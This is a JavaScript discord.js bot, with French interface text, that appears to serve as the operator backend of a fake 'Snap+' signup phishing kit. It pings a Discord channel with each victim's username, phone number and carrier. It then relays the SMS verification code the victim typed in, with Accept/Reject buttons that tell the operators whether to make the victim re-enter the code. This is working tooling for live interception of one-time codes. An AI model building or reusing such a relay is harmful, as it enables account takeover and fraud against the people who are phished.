const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const { users } = require('./store');

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const SEPARATOR = '──────────────────────────────────────────────────────';

client.once('ready', () => {
    console.log(`🤖 Bot Discord connecté : ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;
    
    const [action, username] = interaction.customId.split(':');
    const user = users[username];
    
    if (!user) {
        return interaction.reply({ content: 'Utilisateur introuvable.', ephemeral: true });
    }
    
    if (action === 'accept') {
        user.status = 'verified';
        
        const embed = new EmbedBuilder()
            .setColor('#2ecc71')
            .setDescription(
                `# ✅ Code validé\n` +
                `${SEPARATOR}\n` +
                `### 👤 **Nom d'utilisateur:** ${username}\n` +
                `### 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
                `### 🔢 **Code:** \`${user.submittedCode}\`\n` +
                `### 📅 **Validé à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
                `${SEPARATOR}\n` +
                `*Utilisateur vérifié*`
            );
        
        await interaction.update({ 
            content: '@everyone', 
            embeds: [embed], 
            components: [] 
        });
    }
    
    if (action === 'reject') {
        user.status = 'rejected';
        const rejectedCode = user.submittedCode;
        user.submittedCode = null;
        
        const embed = new EmbedBuilder()
            .setColor('#e74c3c')
            .setDescription(
                `# 🔒 Code rejeté\n` +
                `${SEPARATOR}\n` +
                `### 👤 **Nom d'utilisateur:** ${username}\n` +
                `### 🔢 **Code saisi:** \`${rejectedCode || 'N/A'}\`\n` +
                `### 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
                `### 📅 **Rejeté à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
                `${SEPARATOR}\n` +
                `*L'utilisateur devra ressaisir le code*`
            );
        
        await interaction.update({ 
            content: '@everyone', 
            embeds: [embed], 
            components: [] 
        });
    }
});

function formatPhoneNumber(phone) {
    if (!phone) return 'N/A';
    return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
}

async function sendInitialEmbed(username, phone) {
    const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
    const user = users[username];
    
    const embed = new EmbedBuilder()
        .setColor('#2b2d31')
        .setDescription(
            `# 📱 Nouvelle inscription Snap+\n` +
            `${SEPARATOR}\n` +
            `### 👤 **Nom d'utilisateur:** ${username}\n` +
            `### 📞 **Téléphone:** ${formatPhoneNumber(phone)}\n` +
            `### 🏛️ **Opérateur:** ${user.operator || 'N/A'}\n` +
            `### ⏰ **Date:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
            `${SEPARATOR}\n` +
            `*En attente du code...*`
        );
    
    await channel.send({ 
        content: '@everyone',
        embeds: [embed] 
    });
}

async function sendCodeEmbed(username) {
    const user = users[username];
    const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
    
    const embed = new EmbedBuilder()
        .setColor('#f1c40f')
        .setDescription(
            `# 🔒 Code de vérification soumis\n` +
            `${SEPARATOR}\n` +
            `### 👤 **Nom d'utilisateur:** ${username}\n` +
            `### 🔢 **Code saisi:** \`${user.submittedCode}\`\n` +
            `### 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
            `### 📅 **Soumis à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
            `${SEPARATOR}\n` +
            `*En attente de validation par un modérateur*`
        );
    
    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`accept:${username}`).setLabel('Accepter').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`reject:${username}`).setLabel('Refuser').setStyle(ButtonStyle.Danger)
    );
    
    await channel.send({ 
        content: '@everyone',
        embeds: [embed], 
        components: [row] 
    });
}

client.login(process.env.BOT_TOKEN);

module.exports = { sendInitialEmbed, sendCodeEmbed };